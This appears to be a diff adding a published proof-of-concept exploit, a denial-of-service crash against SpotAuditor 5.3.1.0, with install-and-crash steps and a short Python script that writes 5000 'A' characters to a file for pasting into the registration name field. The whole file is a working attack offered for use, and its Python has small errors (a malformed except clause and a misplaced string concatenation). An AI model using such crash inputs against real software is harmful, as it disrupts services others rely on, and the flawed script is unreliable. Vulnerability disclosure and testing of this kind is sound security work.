@@ -1,0 +1,32 @@
+# Exploit Title: SpotAuditor 5.3.1.0 - Denial of Service
+# Author: Sanjana Shetty
+# Date: 2019-10-13
+# Version: SpotAuditor 5.3.1.0
+# Vendor Homepage: http://www.nsauditor.com
+# Software link: http://spotauditor.nsauditor.com/
+
+
+# <POC by Sanjana Shetty>
+# Steps
+
+[1] Install the SpotAuditor software
+
+[2] Access the register functionality
+
+[3] In the name field enter 5000 A's and press enter, this will crash the
+application.
+
+==== use below script to create 5000 A's to a text file and copy it to the name field============
+
+
+print ("# POC by sanjana shetty")
+
+try:
+       f = open("file.txt","w")
+       junk =  "\x41" * 5000
+       f.write(junk)
+       print ("done")
+
+except (Exception, e):
+
+      print ("#error - ") + str(e)
